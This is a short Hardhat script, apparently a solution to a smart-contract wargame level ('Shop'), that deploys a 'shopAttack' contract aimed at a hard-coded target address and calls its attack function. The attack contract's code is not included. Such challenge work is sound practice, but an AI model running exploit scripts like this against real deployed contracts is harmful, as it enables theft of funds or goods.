const { ethers } = require("hardhat");

const CONTRACT_ADDRESS = "0xf3eE3C4Ec25e8414838567818A30C90c7d62f834";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";
const contractInterface = [
  {
    inputs: [],
    name: "buy",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
    signature: "0xa6f2ae3a",
  },
  {
    inputs: [],
    name: "isSold",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0xe852e741",
  },
  {
    inputs: [],
    name: "price",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
    constant: true,
    signature: "0xa035b1fe",
  },
];

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  //   Deploy the PayableContract
  const shopAttackFactory = await ethers.getContractFactory(
    "shopAttack",
    signer
  );
  const shopAttack = await shopAttackFactory.deploy(CONTRACT_ADDRESS);
  await shopAttack.deployed();
  console.log("PayableContract deployed to:", shopAttack.address);

  await shopAttack.attack();
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
